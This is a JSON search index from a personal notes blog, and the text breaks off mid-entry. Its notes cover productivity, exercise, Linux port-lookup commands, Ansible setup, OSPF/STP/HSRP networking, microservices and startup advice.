{"categories":[{"title":"syntax","uri":"https://kenmlai.me/categories/syntax/"},{"title":"themes","uri":"https://kenmlai.me/categories/themes/"}],"posts":[{"content":"How long should you work a time A break is ~15 minutes. Before noon, 90 minutes a time before taking a break; After noon, take a break every hour.1\n  Here’s exactly how long your work breaks should be  \u0026#x21a9;\u0026#xfe0e;\n   ","id":0,"section":"notes","summary":"How long should you work a time A break is ~15 minutes. Before noon, 90 minutes a time before taking a break; After noon, take a break every hour.1\n  Here’s exactly how long your work breaks should be  \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["Australia","QLD","Fortitude Valley","productivity","work"],"title":"","uri":"https://kenmlai.me/notes/202003192005/","year":"2020"},{"content":"High-Intensity Circuit Training Using Body Weight HICT can be a fast and efficient way of lose weight and fat and an efficient approach to decreasing insulin resistance too.1\n 8-12 repetitions are recommend by ACSM for each major muscle group of a bout1 people with hypertension or deart disease should avoid isometric exercises. 1 It may NOT good for training for absolute strength, specific endurance and other specific performance.1  Exercise Order\nThe object is to allow a series of exercises in proper form and technique in quick succession with minimal rest in between (\u0026lt;=15s)\n Using opposing muscle groups in subsequent exercises (Upper body, lower body, core, etc.) Alternative between exercises which significantly increase and reduce heart rate (cardio-intensive and strength-intensive)  Number of Exercises\n No ideal number 30 seconds a bout is usually enough 2-3 circuits may be required to reach exercise purpose, since most people may not exceed 100% V.O2max.    HIGH-INTENSITY CIRCUIT TRAINING USING BODY WEIGHT: Maximum R\u0026hellip; : ACSM\u0026rsquo;s Health \u0026amp; Fitness Journal \u0026#x21a9;\u0026#xfe0e;\n   ","id":1,"section":"notes","summary":"High-Intensity Circuit Training Using Body Weight HICT can be a fast and efficient way of lose weight and fat and an efficient approach to decreasing insulin resistance too.1\n 8-12 repetitions are recommend by ACSM for each major muscle group of a bout1 people with hypertension or deart disease should avoid isometric exercises. 1 It may NOT good for training for absolute strength, specific endurance and other specific performance.1  Exercise Order","tags":["Australia","QLD","Fortitude Valley","Training","Health"],"title":"","uri":"https://kenmlai.me/notes/202003151302/","year":"2020"},{"content":"How to find which process has occupied a specific port Methods netstat1 sudo apt install net-tools sudo netstat -ltnp  lsof1 sudo apt install lsof sudo lsof -i :80   DON\u0026rsquo;T forget the : before the port number  fuser1 sudo apt install psmisc # show a port number is listening by a process number sudo fuser 3306/tcp # check the process name by the process number ps -p [processID] -o comm=  Usability Test    Method Linux Mac     netstat ✅ ❌   lsof ✅ ✅   fuser ✅ ❌      Linux: Find Out Which Port Number a Process is Listening on  \u0026#x21a9;\u0026#xfe0e;\n   ","id":2,"section":"notes","summary":"How to find which process has occupied a specific port Methods netstat1 sudo apt install net-tools sudo netstat -ltnp  lsof1 sudo apt install lsof sudo lsof -i :80   DON\u0026rsquo;T forget the : before the port number  fuser1 sudo apt install psmisc # show a port number is listening by a process number sudo fuser 3306/tcp # check the process name by the process number ps -p [processID] -o comm=  Usability Test    Method Linux Mac     netstat ✅ ❌   lsof ✅ ✅   fuser ✅ ❌      Linux: Find Out Which Port Number a Process is Listening on  \u0026#x21a9;\u0026#xfe0e;","tags":["Australia","QLD","Fortitude Valley","port","MacOS","Linux","cli"],"title":"","uri":"https://kenmlai.me/notes/202003151330/","year":"2020"},{"content":"Meek使用前置域名，将Tor流量伪装成访问其他HTTPS站点的流量。1\n  基于云流量混淆的Tor匿名通信识别方法 \u0026#x21a9;\u0026#xfe0e;\n   ","id":3,"section":"notes","summary":"Meek使用前置域名，将Tor流量伪装成访问其他HTTPS站点的流量。1 基于云流量混淆的Tor匿名通信识别方法 \u0026#x21a9;\u0026#xfe0e;","tags":["Australia","QLD","Fortitude Valley","Tor","Meek"],"title":"","uri":"https://kenmlai.me/notes/202003141522/","year":"2020"},{"content":"Since AWS lambda bills according to the number of calls and computing time. We can use parallel process to reduce the time to save the cost1.\nwith concurrent.futures.ThreadPoolExecutor(max_workers=60)as executor: result = executor.map(core_function, iterable)    Halving our AWS Lambda bill with parallel processing in Python  \u0026#x21a9;\u0026#xfe0e;\n   ","id":4,"section":"notes","summary":"Since AWS lambda bills according to the number of calls and computing time. We can use parallel process to reduce the time to save the cost1.\nwith concurrent.futures.ThreadPoolExecutor(max_workers=60)as executor: result = executor.map(core_function, iterable)    Halving our AWS Lambda bill with parallel processing in Python  \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["Australia","Fortitude Valley","QLD","Parameter Store","AWS","Python","Lambda","Parallel"],"title":"","uri":"https://kenmlai.me/notes/202003061909/","year":"2020"},{"content":"\u0026ldquo;Ansible: Setup, Configure, and Ad Hoc Commands Deep Dive\u0026rdquo; study note The course focuses on ad hoc commands of Ansible\nabout Ansible ansible is run a task against a single host ansible-playbook is running a set of tasks against a single or a groups of hosts\n##how to setup ansible default inventory file: /etc/ansible/hosts\nit\u0026rsquo;s recommended to add a new user for ansible. Besides security considerations, systems may not share the same user name in default. this makes login with ansible with tedious work.\ntry to ssh to the hosts manually for the first time before using ansible against them, if no ssh key file is used.\nconfiguring ssh and sudo for ansible config user for ansible on hosts useradd ansible passwd ansible   ssh to the hosts after adding new users to save ssh keys or (recommended) ssh-copy-id to copy remote keys to local.  on server, first generate key files by ssh-keygen then use ssh-copy-id \u0026lt;managed host\u0026gt; on the server to copy id to the server\nescalate privilege on remote hosts -K can be used to specify sudo password on remote system when privilege escalation is needed (-b). It can be quite challenging when running ansible against multiple systems\nedit /etc/sudoers and add ansible for running ansible without a password or a predefined password across all machines.\nadd the following line in the /etc/sudoers to enable it.:\nansible ALL=(ALL) NOPASSWD: ALL  Ansible configuration file the default config file is located at /etc/ansible/ansible.cfg\nor a command ansible-config can be used to show the current config\nthere can be multiple config files and ansible only use the first config found and ignores the rest. the search path follows:\n ANSIBLE_CONFIG (environment variable) ansible.cfg (in current directory) ~/.ansible.cfg (in home folder) /etc/ansible/ansible.cfg  setting up ansible inventory the inventory is a list of hosts that Ansible manages, which is in /etc/ansible/hosts\nsimilar to the config file, there can be more than one host files, the search order follows:\n default inventory file (/etc/ansible/hosts) specified by CLI (ansible -i \u0026lt;filename\u0026gt;) config in ansible.cfg  note that, ansible.cfg is the ansible configuration file whose search order has been mentioned in the pervious section.\nin the inventory file, multiple hosts can be grouped like\n[group1] host1 host2 ...  then the group name can be used to specify hosts: ansible -m ping -i inventory group1\nansible command understanding ansible modules The Shell and Command Modules shell module is the default module for ansible, so the -m can be omitted for running any shell command and only -a is needed to specify the actual command to run\ncollecting system information setup module is used for collecitng facts from hosts\nworking with the file and copy modules file is used to create, delete, modify file properties\ncopy is used to copy files from:\n control node to targets files on the targets content created by copy module to target (= create a file with specified content) (don\u0026rsquo;t recommended personally)  editing file contents with the lineinfile module lineinfile append, insert, delete a line of a file\n==Why don\u0026rsquo;t we prepare the what content we want beforehand instead of dynamically editing a file?==\nreplace provides more granular changes using RE\ndownloading files with get_url module supported protocols: HTTPS, HTTP, FTP\nimportant arguments:\n url dest. absolute path ONLY use_proxy url_username, url_password  working with file archives archive and unarchive are for archive files (compress and uncompress)\ncreating system users with the user module important arguments:\n append. if yes, add the user to the groups specified; if no, add the user to the groups specified and remove it from all other groups  working with the group module similar to the user module\ninstalling software yum and apt are used on specific distribution\npackage will automatically detect host distribution, which is recommended\ncontrol daemons with the service module important arguments:\n name state. started, enabled  managing long-running commands  -B provide timeout and initiate the operation. Fail if the timeout exceeded. -P polling of the operation on a set interval. -P 0 means to disable reporting async_status is used to check status. useful in playbooks, not ad-hoc command  Parallelism in Ansible fork is used to specify how many hosts are targeted at the same time.\ndefault is 5, use -f or --fork to change specify the number, or change it in the ansible.cfg file\n","id":5,"section":"notes","summary":"\u0026ldquo;Ansible: Setup, Configure, and Ad Hoc Commands Deep Dive\u0026rdquo; study note The course focuses on ad hoc commands of Ansible\nabout Ansible ansible is run a task against a single host ansible-playbook is running a set of tasks against a single or a groups of hosts\n##how to setup ansible default inventory file: /etc/ansible/hosts\nit\u0026rsquo;s recommended to add a new user for ansible. Besides security considerations, systems may not share the same user name in default.","tags":["Automation","Ansible","CLI"],"title":"","uri":"https://kenmlai.me/notes/202002190000/","year":"2020"},{"content":"所谓的“1万小时学习”，更多的是强调学习方法。在不正确或者低效率的方法下，收益可能远不如话费的时间价值大。\n这种学习方法包括：\n 永远只在“学习区”1刻意练习2。即在已有知识的基础上更进一步。停留在舒适区会让人“机械化”。过分追求单个技术动作的完美并不是最好的进步方式3。 掌握套路（规律）4——高度针对性的大量重复训练5。针对新的练习内容，将其分成多个部分5，大量重复的练习每个部分6已达大脑和身体能够“自动化”完成这个部分。每个部分可能因为自身条件不同，学习进度也有所不同，这时应该用最有针对性的方式来进行练习7，并有明确的练习目标8。 即时反馈。注意自己的错误，或者依赖他人的反馈来发现自己注意得到的错误9。而针对性练习也是针对自身的错误进行纠正的过程。 刻意练习不好玩儿10。其中没有“寓教于乐”这个概念11。 对胜利的渴望。大部分竞争没有双赢，没有强烈的欲望获胜，就无法成功。功利是非常有效，且应该鼓励的。    熟知的知识在舒适区，暂时无法学会知识在恐慌区 \u0026#x21a9;\u0026#xfe0e;\n 万万没想到 p.96 \u0026#x21a9;\u0026#xfe0e;\n 万万没想到 p.98 \u0026#x21a9;\u0026#xfe0e;\n 万万没想到 p.100 \u0026#x21a9;\u0026#xfe0e;\n 万万没想到 p.104 \u0026#x21a9;\u0026#xfe0e;\n 万万没想到 p.107 \u0026#x21a9;\u0026#xfe0e;\n 比如某个发音有问题，就应当针对这个发音在不同情况下做大量重复练习。 \u0026#x21a9;\u0026#xfe0e;\n 万万没想到 p.110 \u0026#x21a9;\u0026#xfe0e;\n 万万没想到 p.113 \u0026#x21a9;\u0026#xfe0e;\n 万万没想到 p.119 \u0026#x21a9;\u0026#xfe0e;\n 万万没想到 p.123 \u0026#x21a9;\u0026#xfe0e;\n   ","id":6,"section":"notes","summary":"所谓的“1万小时学习”，更多的是强调学习方法。在不正确或者低效率的方法下，收益可能远不如话费的时间价值大。 这种学习方法包括： 永远只在“学习区","tags":["Australia","NSW","Hurstville","self-learning","growth"],"title":"","uri":"https://kenmlai.me/notes/202002191731/","year":"2020"},{"content":"confirmation bias （确认偏误） 是一种心理认知倾向：人们倾向于主动寻找自己相信的信息，即使有相反的信息，也可能会被用来加强已有的观念。1\n主动获取和自己观点相反的信息，可以有助于修正确认偏误2\n  万万没想到 p.23 \u0026#x21a9;\u0026#xfe0e;\n 万万没想到 p. 26 \u0026#x21a9;\u0026#xfe0e;\n   ","id":7,"section":"notes","summary":"confirmation bias （确认偏误） 是一种心理认知倾向：人们倾向于主动寻找自己相信的信息，即使有相反的信息，也可能会被用来加强已有的观念。1 主动获取和自己观点相","tags":["Australia","NSW","Hurstville","psychology","confirmation bias"],"title":"","uri":"https://kenmlai.me/notes/202002182245/","year":"2020"},{"content":"minimal path to success providing short-term rewards and then continuously help to customers is the minimal path to awesome1.\n  \u0026ldquo;PEOPLE NEED MY PRODUCT!\u0026rdquo; (BUT DO THEY WANT IT?) \u0026#x21a9;\u0026#xfe0e;\n   ","id":8,"section":"notes","summary":"minimal path to success providing short-term rewards and then continuously help to customers is the minimal path to awesome1.\n  \u0026ldquo;PEOPLE NEED MY PRODUCT!\u0026rdquo; (BUT DO THEY WANT IT?) \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["success"],"title":"","uri":"https://kenmlai.me/notes/202002122152/","year":"2020"},{"content":"What\u0026rsquo;s zombie startups? companies that have the outside appearance of a startup but that aren’t moving that quickly and that are likely to always stay small, kept alive with suboptimal sources of funding (bad angel investors, subsidies, grants, etc.)1\n  [[Avoiding Zombie Startups - Welcome to The Family]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":9,"section":"notes","summary":"What\u0026rsquo;s zombie startups? companies that have the outside appearance of a startup but that aren’t moving that quickly and that are likely to always stay small, kept alive with suboptimal sources of funding (bad angel investors, subsidies, grants, etc.)1\n  [[Avoiding Zombie Startups - Welcome to The Family]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["Australia","Hurstville","NSW","startup"],"title":"","uri":"https://kenmlai.me/notes/202002101022/","year":"2020"},{"content":"Unfamiliarity impedes adoption of productions. A product should be improved and innovated with a similarity of existence, which makes users easier to understand and expect1.\n  [[California Roll Rule: The Familiar Done Differently | NirandFar]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":10,"section":"notes","summary":"Unfamiliarity impedes adoption of productions. A product should be improved and innovated with a similarity of existence, which makes users easier to understand and expect1.\n  [[California Roll Rule: The Familiar Done Differently | NirandFar]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["Australia","Hurstville","NSW","product"],"title":"","uri":"https://kenmlai.me/notes/202002081057/","year":"2020"},{"content":"OSPF study notes Packet type:\n Hello: discover and maintain neighbornood DBD: LSA header information, like a dictionary of LSAs LSR: request LSA LSU: update LSA (may contain several LSA) LS ACK: confirmation  LSA type:\n   Type advertizer scope content      1 all routers running ospf local area directly connected interfaces    2 DR local area mask of a MA network    3 ABR AS summary of LSA 1 \u0026amp; 2    4 ABR in which area an ASBR exist AS where the ASBR is    5 ASBR AS external routes    6   Group Membership LSA    7 ASBR of NSSA in the NSSA external routes    8 all routers in IPv6 (LSA 1 for ipv6)      9 DR in IPv6 (LSA 2 for ipv6)      10   MPLS TE    11   MPLS TE     Route types:\n O: LSA 1, 2 O IA, LSA 3 O E1, LSA 5 cost increase O E2, LSA 5 cost does NOT increase O N1, LSA 7 cost increase O N2, LSA 7 cost does NOT increase  Network types:\n BMA: hello timer 10s, DR will be selected P2P: hello timer 10s, DR will be selected P2MP P2MP NB NBMA: hello timer 30s Loopback  Area types:\n   Type characteristics     stub no LSA 4, 5. default route from ABR (LSA 3), no external routes allowed   totally stub no LSA 3, 4, 5. default route from ABR (LSA 3), no external routes allowed   NSSA no LSA 4, 5. no default route from ABR, external routes allowed   totally NSSA (Cisco Only) no LSA 3, 4, 5. default route from ABR (LSA 3), external routes allowed    neighbor relationship:\n   Type characteristics     down only in frame-relay   attempt only in frame-relay   init send hello packet   2-way elect DR \u0026amp; BDR   ex-start send DBD packets, select master/slave (whose sequence number will be used)   exchange exchange LSA information (LSR, LSU)   loading respond ack, start SPF caculation   full put best routes into routing table, neighbor connection finished    DR \u0026amp; BDR election:\n priority, default is 1, 0 means the router doesn’t attempt election Router ID, stuck in down if router ids are the same  ","id":11,"section":"notes","summary":"OSPF study notes Packet type:\n Hello: discover and maintain neighbornood DBD: LSA header information, like a dictionary of LSAs LSR: request LSA LSU: update LSA (may contain several LSA) LS ACK: confirmation  LSA type:\n   Type advertizer scope content      1 all routers running ospf local area directly connected interfaces    2 DR local area mask of a MA network    3 ABR AS summary of LSA 1 \u0026amp; 2    4 ABR in which area an ASBR exist AS where the ASBR is    5 ASBR AS external routes    6   Group Membership LSA    7 ASBR of NSSA in the NSSA external routes    8 all routers in IPv6 (LSA 1 for ipv6)      9 DR in IPv6 (LSA 2 for ipv6)      10   MPLS TE    11   MPLS TE     Route types:","tags":["protocol","network","ospf"],"title":"","uri":"https://kenmlai.me/notes/202002071114/","year":"2020"},{"content":"STP study notes used to prevent loop in L2 by selecting root bridge to make a tree-like logical topology\nElection:\n Priority. smaller is better MAC. smaller is better  steps of Blocking a interface:\n all ports of the root bridge are designated interfaces, in forwarding state select all root port on non-root bridges, in forwarding state select designated interfaces in the rest networks, priority -\u0026gt; cost -\u0026gt; mac (smaller is better) block the rest interfaces  root port selection rule:\n lower cost to root bridge  STP optimization:\n portfast: stop receiving BPDU, save 30s uplinkfast:, used on access switches, save 30s backbonefast: used on all switches, save 20s  STP security:\n BPDU guard: filter BPDU on access ports, put interfaces on err-disable when receiving BPDU BPDU filter: filter BPDU on access ports, drop BPDU, no change on interfaces. UDLD: detect packet forwarding on hardware level, put interfaces in err-disable when forwarding error happens loop guard: detect congestion on software level, put interfaces in err-disable when congestion happens root guard: prevents a port from becoming root port or blocked port.  RSTP: STP with portfast \u0026amp; uplinkfast MST: share logical tree topology among VLANs based on MST instances\n","id":12,"section":"notes","summary":"STP study notes used to prevent loop in L2 by selecting root bridge to make a tree-like logical topology\nElection:\n Priority. smaller is better MAC. smaller is better  steps of Blocking a interface:\n all ports of the root bridge are designated interfaces, in forwarding state select all root port on non-root bridges, in forwarding state select designated interfaces in the rest networks, priority -\u0026gt; cost -\u0026gt; mac (smaller is better) block the rest interfaces  root port selection rule:","tags":["protocol","network","spanning tree"],"title":"","uri":"https://kenmlai.me/notes/202002071240/","year":"2020"},{"content":"Partnership Fallacy a simply combination of people/firms/teams with different strength \u0026amp; weakness doesn’t necessary mean a better team, ideas are biased based on their strength and often lack wholistic view1.\n  [[Bill Barnett on Strategy: The Partnership Fallacy]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":13,"section":"notes","summary":"Partnership Fallacy a simply combination of people/firms/teams with different strength \u0026amp; weakness doesn’t necessary mean a better team, ideas are biased based on their strength and often lack wholistic view1.\n  [[Bill Barnett on Strategy: The Partnership Fallacy]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["management","psychology"],"title":"","uri":"https://kenmlai.me/notes/202002072032/","year":"2020"},{"content":"why customers pay Customers pay for what they have faced in lives, not average people need to do.1\nFocusing on what users need is more directly than what developers want1 2.\n  [[Jobs to be Done - Christensen Institute : Christensen Institute]] \u0026#x21a9;\u0026#xfe0e;\n [[Marc Benioff: Win Customers by Treating Them Like Partners - Salesforce Blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":14,"section":"notes","summary":"why customers pay Customers pay for what they have faced in lives, not average people need to do.1\nFocusing on what users need is more directly than what developers want1 2.\n  [[Jobs to be Done - Christensen Institute : Christensen Institute]] \u0026#x21a9;\u0026#xfe0e;\n [[Marc Benioff: Win Customers by Treating Them Like Partners - Salesforce Blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["business"],"title":"","uri":"https://kenmlai.me/notes/202002072230/","year":"2020"},{"content":"ratio between lines written and in production The ratio lines of codes, words of books and etc. is 10:1 between lines ever written and lines in final production.1\n  [[The 10:1 rule of writing and programming]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":15,"section":"notes","summary":"ratio between lines written and in production The ratio lines of codes, words of books and etc. is 10:1 between lines ever written and lines in final production.1\n  [[The 10:1 rule of writing and programming]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["writing","production"],"title":"","uri":"https://kenmlai.me/notes/202002061447/","year":"2020"},{"content":"Pros \u0026amp; Cons of using microservices Pros: Easier to test, deploy, and monitor since each service works independently,\n service can scale better at a specific bottleneck can serving older and newer version at the same time, and let older ones phase out gradually development, test \u0026amp; deployment of each service is independent  Cons: latency between services and management issue\n A service depending on several calls to others may suffer from a huge delay different teams may work on the same/similar service at the same time, extra assessments are needed.  Besides, good documentation is always needed and a discovery tool also make operation easier.\nRef: 1\n  [[Microservices at Spotify]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":16,"section":"notes","summary":"Pros \u0026amp; Cons of using microservices Pros: Easier to test, deploy, and monitor since each service works independently,\n service can scale better at a specific bottleneck can serving older and newer version at the same time, and let older ones phase out gradually development, test \u0026amp; deployment of each service is independent  Cons: latency between services and management issue\n A service depending on several calls to others may suffer from a huge delay different teams may work on the same/similar service at the same time, extra assessments are needed.","tags":["microservices","development"],"title":"","uri":"https://kenmlai.me/notes/202002061500/","year":"2020"},{"content":"Meeting\nMeetings with purposes are good, otherwise they are finding problems with solutions.1\ninformal chat is also a meeting, that is useful\n  [[Bill Barnett on Strategy: Delete All Meetings!]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":17,"section":"notes","summary":"Meeting\nMeetings with purposes are good, otherwise they are finding problems with solutions.1\ninformal chat is also a meeting, that is useful\n  [[Bill Barnett on Strategy: Delete All Meetings!]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["career","meeting","work"],"title":"","uri":"https://kenmlai.me/notes/202002061611/","year":"2020"},{"content":"HSRP study notes Active, Standby routers:\n Active: the router forwards packets in a HSRP group Standby: the router listens in a HSRP group  Hello packet send 224.0.0.2\nelection rule: priority (default is 100) \u0026gt; interface ip (bigger is better)\nState machine:\n Initial Learn Listen Speak Standby Active  ","id":18,"section":"notes","summary":"HSRP study notes Active, Standby routers:\n Active: the router forwards packets in a HSRP group Standby: the router listens in a HSRP group  Hello packet send 224.0.0.2\nelection rule: priority (default is 100) \u0026gt; interface ip (bigger is better)\nState machine:\n Initial Learn Listen Speak Standby Active  ","tags":["protocol","network","hsrp"],"title":"","uri":"https://kenmlai.me/notes/202002062323/","year":"2020"},{"content":"Good practices to keep being lucky scientifically People tend to name themselves and bad or good luck for their experience, but Luck is a final outcome of a person\u0026rsquo;s thoughts and behaviour in a subtle way. The thoughts and behaviour are rarely noticed so luck would be the only reason for what has happened.1\nFor example, lucky people can spot more opportunities and are less tense than the unlucky ones, Unlucky people are usually too purpose centric thus don\u0026rsquo;t pay any attention to related things, this leads them missing possibilities. They are also suffered from the anxiety1 2, which is brought by their \u0026ldquo;bad luck\u0026rdquo; and disrupts their abilities to notice unexpected. This is a downward spin that make them feel from bad to worse, and is why they tend to say they have bad luck constantly.\nGood luck can be formed by four pillars:1\n skills of creating and noticing chance opportunities. listening to intuition create self-fulfilling prophesies via positive expectation adopt a resilient attitude that transforms bad into good.    [[Be lucky - it\u0026rsquo;s an easy skill to learn - Telegraph]] \u0026#x21a9;\u0026#xfe0e;\n [[Focus on your own shit]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":19,"section":"notes","summary":"Good practices to keep being lucky scientifically People tend to name themselves and bad or good luck for their experience, but Luck is a final outcome of a person\u0026rsquo;s thoughts and behaviour in a subtle way. The thoughts and behaviour are rarely noticed so luck would be the only reason for what has happened.1\nFor example, lucky people can spot more opportunities and are less tense than the unlucky ones, Unlucky people are usually too purpose centric thus don\u0026rsquo;t pay any attention to related things, this leads them missing possibilities.","tags":[],"title":"","uri":"https://kenmlai.me/notes/201911221354/","year":"2019"},{"content":"Checklist for Projects  Human labor should ONLY involved in places for creativity. Any routines that are done manually should be automatically or ditched.  Style:\n Standard style applied for the same type of code Code coverage should be \u0026gt;= 95%  Tests: [ ] Unit tests exist for all features of components [ ] Integration tests [ ] End to end tests [ ] Has Daily build [ ] The daily build is deployed in a test environment automatically daily\nDeployment: [ ] The deployment is done automatically after all tests have passed. [ ] The versions are consistent across all systems.\n","id":20,"section":"notes","summary":"Checklist for Projects  Human labor should ONLY involved in places for creativity. Any routines that are done manually should be automatically or ditched.  Style:\n Standard style applied for the same type of code Code coverage should be \u0026gt;= 95%  Tests: [ ] Unit tests exist for all features of components [ ] Integration tests [ ] End to end tests [ ] Has Daily build [ ] The daily build is deployed in a test environment automatically daily","tags":["Automation","Checklist","Project","CICD"],"title":"","uri":"https://kenmlai.me/notes/201911151310/","year":"2019"},{"content":"OSPF Areas and Summarization may not be needed OSPF areas and summarization are two mechanisms designed to reduce routers\u0026rsquo; CPU and memory consumption, speed up the convergence and isolate impacts from changes.\nFrom their design purpose, some are not true at 2019:1\n  Reduce CPU and memory usage is mainly because both techniques result a smaller routing table. Unless the network is huge, this is not true. The CPU power and memory are significantly cheaper than both were designed, routers can easily handle a lot of routes now. Incremental SPF has also been introduced for years as well, which reduces the calculation a lot.\n  From the above point, the difference between using both (or one of ) methods or not is not obvious now.\n  Isolation of impacts. This is the only benefits for use them, since a change in a area won\u0026rsquo;t impact others, especially there\u0026rsquo;s a link damping. We have alternatives like event dampening or automation scripts to make the link offline for a period.\n  The issues these techniques bring to the network are:\n strict hierarchical design potentially announcing the same summarised prefix to create blackholes  Some reasons may prevent us removing them, like:2\n vendor specific implementation, which implies a bad smell of the code quality license issue which limits the number of routes old devices.    [[Do We Still Need OSPF Areas and Summarization? « ipSpace.net blog]] \u0026#x21a9;\u0026#xfe0e;\n [[OSPF Areas and Summarization: Theory and Reality « ipSpace.net blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":21,"section":"notes","summary":"OSPF Areas and Summarization may not be needed OSPF areas and summarization are two mechanisms designed to reduce routers\u0026rsquo; CPU and memory consumption, speed up the convergence and isolate impacts from changes.\nFrom their design purpose, some are not true at 2019:1\n  Reduce CPU and memory usage is mainly because both techniques result a smaller routing table. Unless the network is huge, this is not true. The CPU power and memory are significantly cheaper than both were designed, routers can easily handle a lot of routes now.","tags":["OSPF","autosummary","protocol"],"title":"","uri":"https://kenmlai.me/notes/201911151418/","year":"2019"},{"content":"Nornir\u0026rsquo;s Speed for automation Ansible is a single-thread framework that each task can only run after its previous one. When automating a large scale network (\u0026gt;= 1000), it\u0026rsquo;s performance will become the main drawback.\nOn the other hand, Nornir is implemented in multi-thread, the time-complexity is lower than Ansible predictably.\nRef: [[Ansible vs. Nornir: Speed Challenge]]\n","id":22,"section":"notes","summary":"Nornir\u0026rsquo;s Speed for automation Ansible is a single-thread framework that each task can only run after its previous one. When automating a large scale network (\u0026gt;= 1000), it\u0026rsquo;s performance will become the main drawback.\nOn the other hand, Nornir is implemented in multi-thread, the time-complexity is lower than Ansible predictably.\nRef: [[Ansible vs. Nornir: Speed Challenge]]","tags":["Automation","Networking","Ansible","Nornir"],"title":"","uri":"https://kenmlai.me/notes/201911141111/","year":"2019"},{"content":"Ways\u0026rsquo; of Detecting Delusional Companies Here\u0026rsquo;s some ways of detecting delusional companies, especially startups.\n Claim to make you rich. Playing blame game. The toxic aspect is either complaining about leadership or leadership blaming specific people and teams across the whole company. It\u0026rsquo;s a culture that throw each other under the bus, it doesn\u0026rsquo;t function well. Happy about the current state, stop seeking for better. Once you\u0026rsquo;re happy, you\u0026rsquo;re in a maintenance mode. Any production stuck in the maintenance mode is in a slow death, because competition brings out good stuff across the board.  Ref: 1\n  [[Evaluating Delusional Startups]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":23,"section":"notes","summary":"Ways\u0026rsquo; of Detecting Delusional Companies Here\u0026rsquo;s some ways of detecting delusional companies, especially startups.\n Claim to make you rich. Playing blame game. The toxic aspect is either complaining about leadership or leadership blaming specific people and teams across the whole company. It\u0026rsquo;s a culture that throw each other under the bus, it doesn\u0026rsquo;t function well. Happy about the current state, stop seeking for better. Once you\u0026rsquo;re happy, you\u0026rsquo;re in a maintenance mode.","tags":["Startup","Tips"],"title":"","uri":"https://kenmlai.me/notes/201911141127/","year":"2019"},{"content":"Ignore Hypes of Starting Companies There are a lot of stories about how well-known and successful CEOs started their companies in just an overnight and deadly simple reason. They are all hypes, untrue and delusional.\nAs the example of Walmart1, basically none of the story is true for how the giant is so successful. Articles, stories, and videos are tend to make the truth more dramatical to allure eyeballs. This has NEVER been good for studying and learning from their experience. On the other side, details like what obstacles, pitfalls, difficulties and etc. have faced, how they are solved, and why the choices are made are extremely valuable for studying. However, almost all of them are ignored or just scratched surfaces. This type of articles are low in knowledge density, providing nothing more than a piece for gossip.\n  [[Why You Should Ignore Every Founder’s Story About How They Started Their company | TrevorMcKendrick.com]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":24,"section":"notes","summary":"Ignore Hypes of Starting Companies There are a lot of stories about how well-known and successful CEOs started their companies in just an overnight and deadly simple reason. They are all hypes, untrue and delusional.\nAs the example of Walmart1, basically none of the story is true for how the giant is so successful. Articles, stories, and videos are tend to make the truth more dramatical to allure eyeballs. This has NEVER been good for studying and learning from their experience.","tags":["Startup","Reflection"],"title":"","uri":"https://kenmlai.me/notes/201911141700/","year":"2019"},{"content":"Actions Reveal the Value There\u0026rsquo;s ONLY one criterion for valuing people\u0026rsquo;s true desires: What have they done or what are they doing.\nRef: 1\n  [[Actions, not words, reveal our real values | Derek Sivers]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":25,"section":"notes","summary":"Actions Reveal the Value There\u0026rsquo;s ONLY one criterion for valuing people\u0026rsquo;s true desires: What have they done or what are they doing.\nRef: 1\n  [[Actions, not words, reveal our real values | Derek Sivers]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["Reflection","Actions","Thinkings","Idea"],"title":"","uri":"https://kenmlai.me/notes/201911111516/","year":"2019"},{"content":"Tips for High Productivity The essence of high productivity is simply focusing on things with greatest impact and completing them, in another way, it\u0026rsquo;s all about putting time in the right places1. It comes down to how well I can manage the small choices every day1.\nSome tips for better productivity are:\n  Remove the noise to improve focus 1.1 turn off notifications of computers and phones1 1.2 write everything down to empty my mind and persistent my thoughts234 1.3 automate repetitive tasks. write the steps down, review the steps, and automate them.1 1.4 use fewer tools. use good tools and forget others to avoid wasting time of learning new ones and switching tools1\n  Focus to maximise performance 2.1 Do focused work in peak hours1, which also reduce work time5. Focusing on important things in a shorter time and delegating everything possible to others, invest time beforehand to hand it off. 2.2 remove chances of been interrupted. like 1.1 1 2.3 chuck time for similar tasks, don\u0026rsquo;t set unlimited time for any task.1 2.4 Super clear on short and long-term objectives and exactly what needed to be done each day.5 2.5 Commitment of sticking with working schedule5\n  Maintain good health 3.1 workout properly.1 3.2 stay with someone who makes me happy1 3.3 eat healthy and easy to do so. Health food first, and then try to squeeze time out of preparation.1 3.4 having some good music to keep good mood.1\n    [[Mikael Cho\u0026rsquo;s answer to What are the best productivity hacks of startup CEOs? - Quora]] \u0026#x21a9;\u0026#xfe0e;\n [[The Zettelkasten Method]] \u0026#x21a9;\u0026#xfe0e;\n [[尽管去做——无压工作的艺术]] \u0026#x21a9;\u0026#xfe0e;\n [[How to Take Smart NotesOne Simple Technique to Boost Writing, Learning and Thinking – for Students, Academics and Nonfiction Book Writers.]] \u0026#x21a9;\u0026#xfe0e;\n [[9-5 Is Out. Try The 1-6 Instead.]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":26,"section":"notes","summary":"Tips for High Productivity The essence of high productivity is simply focusing on things with greatest impact and completing them, in another way, it\u0026rsquo;s all about putting time in the right places1. It comes down to how well I can manage the small choices every day1. Some tips for better productivity are: Remove the noise to improve focus 1.1 